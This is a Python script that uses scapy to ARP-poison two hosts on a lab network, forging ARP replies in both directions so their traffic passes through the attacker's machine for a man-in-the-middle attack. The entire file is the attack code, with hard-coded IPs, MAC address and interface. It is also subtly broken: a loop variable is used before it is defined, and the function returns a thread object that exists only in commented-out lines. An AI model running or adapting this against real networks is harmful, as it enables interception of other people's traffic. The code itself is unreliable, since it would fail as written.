from scapy.all import *
from scapy.layers.l2 import ARP, getmacbyip, Ether
import threading
import time

host_ip = "192.168.56.103"
target_ip = "192.168.56.101"

host_mac = '08:00:27:d0:25:4b'

ip_to_spoof = '192.168.56.102'


def arp_poison_targets(victims, sleep=0):
    """
    Arp poison the list of victims to redirect traffic towards us
    :param sleep: time to sleep before exiting
    :param victims: list of ip addresses
    :return:
    """
    print(sleep)
    assert len(victims) >= 2, 'We must have at least 2 victims to poison'
    while True:
        for i in range(len(victims) - 1):
            for j in range(j, len(victims)):
                print(i, j)
                # arp poison both ways
                arp_poisoning(victims[i], victims[j])
                arp_poisoning(victims[j], victims[i])

        if sleep > 0:
            time.sleep(sleep)
        else:
            return


def arp_poisoning(target, victim):
    """
    arp poisoning the target arp cache to redirect packets towards the host ip, instead of the victim
    :param target: ip of target to poison
    :param victim: ip of the victim to redirect
    :return:
    """
    tmac = getmacbyip(target)
    p = Ether(src=host_mac) / ARP(hwsrc=host_mac, psrc=victim, hwdst=tmac, pdst=target)
    sendp(p, iface='enp0s3')


def mitm_attack(victims):
    """
    Setup continuous arp poisoning and redirect packets between victims via this host
    :param victims: list of ip addresses
    :return:
    """
    # start arp poisoning
    # th = threading.Thread(target=arp_poison_targets, args=(victims,), kwargs={'sleep': 60})
    # th.start()
    time.sleep(2)
    arp_poison_targets(victims, sleep=60)
    print('Started, arp poisoning')

    return th


th = mitm_attack([target_ip, ip_to_spoof])
